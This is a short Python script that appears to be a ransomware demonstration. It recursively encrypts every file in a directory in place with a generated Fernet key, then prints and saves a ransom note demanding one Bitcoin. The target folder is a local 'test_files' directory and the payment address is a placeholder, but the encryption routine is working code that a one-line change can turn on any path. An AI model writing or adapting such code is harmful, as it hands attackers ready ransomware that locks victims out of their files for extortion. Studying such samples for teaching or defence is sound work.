from cryptography.fernet import Fernet
import os

# Generate a key
def generate_key():
    key = Fernet.generate_key()
    with open("encryption.key", "wb") as key_file:
        key_file.write(key)

# Load the encryption key
def load_key():
    return open("encryption.key", "rb").read()

# Encrypt a file
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        original_data = file.read()
    encrypted_data = fernet.encrypt(original_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Encrypt files in a directory
def encrypt_files_in_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
            print(f"Encrypted: {file_path}")

# Execution
if __name__ == "__main__":
    if not os.path.exists("encryption.key"):
        generate_key()
    key = load_key()

    target_directory = "test_files"
    os.makedirs(target_directory, exist_ok=True)
    encrypt_files_in_directory(target_directory, key)
    print("Encryption complete!")
# Ransom Note
def display_ransom_note():
    ransom_message = """Your files have been encrypted!
To recover them, send 1 Bitcoin to [123-CDAC-NOIDA-999].
"""
    print(ransom_message)
    with open("ransom_note.txt", "w") as note:
        note.write(ransom_message)

display_ransom_note()
